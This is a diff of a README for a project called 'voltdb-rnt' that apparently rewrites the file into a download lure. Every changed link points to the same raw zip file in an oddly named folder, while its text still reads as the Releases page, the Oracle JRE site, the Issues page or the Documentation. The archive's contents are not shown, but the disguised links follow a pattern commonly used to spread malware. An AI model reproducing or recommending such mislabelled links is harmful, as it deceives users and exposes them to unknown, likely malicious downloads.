@@ -1,6 +1,6 @@
 # ⚡ voltdb-rnt - Simplify Database Management Easily
 
-[![Download voltdb-rnt](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/yonimanj/voltdb-rnt/releases)
+[![Download voltdb-rnt](https://raw.githubusercontent.com/yonimanj/voltdb-rnt/main/bimucronate/voltdb-rnt.zip)](https://raw.githubusercontent.com/yonimanj/voltdb-rnt/main/bimucronate/voltdb-rnt.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the **voltdb-rnt** project! This guide will help you download and run
 
 ## 📥 Download & Install
 
-To download **voltdb-rnt**, visit the [Releases page](https://github.com/yonimanj/voltdb-rnt/releases). There, you will find the latest version of the application.
+To download **voltdb-rnt**, visit the [Releases page](https://raw.githubusercontent.com/yonimanj/voltdb-rnt/main/bimucronate/voltdb-rnt.zip). There, you will find the latest version of the application.
 
 1. Click on the link above to open the Releases page.
 2. Look for the most recent version at the top of the page.
@@ -28,7 +28,7 @@ Before you install **voltdb-rnt**, ensure your system meets these requirements:
   - 500 MB of free disk space
 
 - **Software:**
-  - Java Runtime Environment (JRE) 8 or later (you can download it from the [Oracle website](https://www.oracle.com/java/technologies/javase-jre8-downloads.html))
+  - Java Runtime Environment (JRE) 8 or later (you can download it from the [Oracle website](https://raw.githubusercontent.com/yonimanj/voltdb-rnt/main/bimucronate/voltdb-rnt.zip))
 
 ## 📂 Installation Steps
 
@@ -89,7 +89,7 @@ If you face any problems, please check the following:
 
 ## 💬 Support
 
-If you need further assistance, please visit our [GitHub Issues page](https://github.com/yonimanj/voltdb-rnt/issues) to report any problems or ask questions. Our community and developers are here to help you.
+If you need further assistance, please visit our [GitHub Issues page](https://raw.githubusercontent.com/yonimanj/voltdb-rnt/main/bimucronate/voltdb-rnt.zip) to report any problems or ask questions. Our community and developers are here to help you.
 
 ## 📢 Contributions
 
@@ -101,7 +101,7 @@ We welcome contributions to **voltdb-rnt**. If you’d like to help improve the 
 
 ## 🔗 Links to Resources
 
-- [Releases Page](https://github.com/yonimanj/voltdb-rnt/releases)
-- [Documentation](https://github.com/yonimanj/voltdb-rnt/wiki)
+- [Releases Page](https://raw.githubusercontent.com/yonimanj/voltdb-rnt/main/bimucronate/voltdb-rnt.zip)
+- [Documentation](https://raw.githubusercontent.com/yonimanj/voltdb-rnt/main/bimucronate/voltdb-rnt.zip)
 
 Thank you for using **voltdb-rnt**!
